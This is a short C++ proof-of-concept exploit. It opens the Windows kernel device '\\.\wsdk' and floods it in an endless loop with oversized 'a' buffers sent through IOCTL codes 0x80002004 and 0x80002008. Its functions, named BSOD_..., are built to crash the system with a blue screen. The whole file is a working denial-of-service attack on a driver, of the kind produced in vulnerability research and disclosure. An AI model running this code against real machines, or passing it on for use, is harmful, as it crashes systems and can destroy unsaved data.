#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\wsdk"

HANDLE hDevice;

void BSOD_80002004()
{
    DWORD dwWrite;
    unsigned char data[0x10000];
    memset(data, 'a', 0x10000);
    while (1)
    {
        DeviceIoControl(hDevice, 0x80002004, data, 0x10000, NULL, 0, &dwWrite, NULL);
    }
}

void BSOD_80002008()
{
    DWORD dwWrite;
    unsigned char data[0x10000];
    memset(data, 'a', 0x10000);
    while (1)
    {
        DeviceIoControl(hDevice, 0x80002008, data, 0x10000, NULL, 0, &dwWrite, NULL);
    }
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    BSOD_80002004();

    system("pause");
    return 0;
}
